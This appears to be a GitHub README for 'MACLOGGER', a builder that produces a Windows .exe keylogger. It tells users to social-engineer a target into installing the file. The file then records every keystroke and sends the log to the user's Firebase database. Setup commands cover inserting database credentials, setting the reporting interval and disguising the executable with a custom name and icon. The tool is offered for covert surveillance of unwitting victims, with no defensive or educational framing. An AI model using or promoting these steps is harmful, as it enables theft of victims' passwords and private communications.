# Mac Logger
<p align="center">
  <img width="600" height="600" src="https://user-images.githubusercontent.com/73078814/169968797-8e91e83d-0322-44df-b5e9-23e17cc2c55c.png">
</p>


# Project Description
<h4>
 <p><b>MACLOGGER</b> is a tool created by Mark Agugo used to generate a .exe keylogger file. This tool is only supported on only windows OS fow now. After going through the usage of this program, you have to social engineer the target to install the .exe file generated and when he does it captures all the target keystrokes and report them to your firebase database after n number of seconds.</p>
  <br />
    <i>
      This program will only till the target shuts down his computer.
    </i>
  <br />
  <h4>
    More features and updates will be added to this program as time goes on.
    Feel free to contribute.
  </h4>  
</h4>

# Installation
```bash
git clone https://github.com/markagugo/maclogger.git
```


# Usage
```bash
//navigate to the maclogger directory you cloned
cd maclogger

//replace the text in the dburl file with your firebase database url and save
notepad DBURL

//paste your firebase json data in the dbjson file and save
notepad DBJSON.json

//replace the text in the TIME file with time you wany before reporting keystrokes file to database and save
notepad TIME

#run the program and parse neceassary parameters
python3 keylogger.py -n ".exe file name" -i ".exe file icon path (.ico file)"
```

